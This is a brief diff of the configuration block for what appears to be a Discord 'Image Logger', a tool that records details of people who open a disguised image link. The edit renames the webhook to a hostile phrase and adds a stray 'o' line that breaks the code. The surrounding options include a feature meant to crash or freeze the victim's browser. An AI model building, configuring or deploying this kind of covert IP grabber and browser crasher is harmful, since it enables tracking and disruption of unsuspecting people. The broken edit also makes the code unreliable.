@@ -16,9 +16,9 @@ config = {
     "image": "https://cdn.discordapp.com/attachments/1374172246221787217/1374182502339448903/IMG_0903.png?ex=682f18ef&is=682dc76f&hm=b72a52f797f770438af25f98c616357d97e38f8ee3047ec3b0c7bac01e69082f&",                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "IMAGE LOGGER | FUCK THEM UP", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
-
+o
     # OPTIONS #
     "crashBrowser": {
         "doCrashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
